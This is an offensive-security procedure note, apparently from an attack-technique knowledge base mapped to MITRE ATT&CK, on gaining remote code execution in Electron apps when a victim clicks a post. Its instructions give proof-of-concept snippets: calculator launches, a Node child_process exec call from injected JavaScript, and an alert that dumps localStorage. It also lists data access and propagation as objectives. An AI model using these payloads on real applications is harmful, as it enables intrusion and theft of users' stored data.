---
tags:
  - rce
  - electron
type: procedure
tools:
  - '[[tools/HTTP-Proxy]]'
  - '[[tools/HTTPS-Enabled-Server]]'
  - '[[tools/Developer-Tools]]'
  - '[[tools/Email-Client]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/open-calculator-macos]]'
  - '[[commands/open-calculator-windows]]'
  - '[[commands/exec-shell-command-nodejs]]'
  - '[[commands/alert-localstorage]]'
platforms:
  - Mac
  - Windows
  - Linux
  - Electron
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 1c72a4b4-5f1f-4c9a-bc72-090f9421af6d
created_at: '2025-12-11T06:10:22.513Z'
updated_at: '2025-12-11T06:10:22.513Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Execute RCE on Victim Interaction

## Summary

This procedure triggers the RCE payload upon victim click, executing arbitrary commands on the host OS.

## Description

Payload bypasses environment, leaks Electron objects, and runs commands like opening apps or accessing localStorage.

## Requirements

1. Victim interaction with Post.
2. Hosted payload active.
3. Developer Tools for testing.

## Defense

Defensive measures and detection strategies:

- Patch Electron vulnerabilities.
- Monitor for unauthorized command execution.

## Objectives

1. Achieve remote code execution.
2. Access private data.
3. Enable propagation.

## Instructions

### Step 1: Trigger Payload

**Context**: Victim clicks, loads JS.

Execute [[commands/open-calculator-macos]] for macOS demo:

```bash
open /Applications/Calculator.app
```

Or [[commands/open-calculator-windows]] for Windows:

```bash
calc
```

Use [[commands/exec-shell-command-nodejs]] in JS:

```javascript
this.require("child_process").exec("open /Applications/Calculator.app")
```

Alternative: [[commands/alert-localstorage]]:

```javascript
alert(JSON.stringify(localStorage))
```

> Expected: Command runs, app opens or data alerts.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/open-calculator-macos]]
- [[commands/open-calculator-windows]]
- [[commands/exec-shell-command-nodejs]]
- [[commands/alert-localstorage]]

## Tools Used

- [[tools/Developer-Tools]]

## Tags

- [[rce]]
- [[electron]]
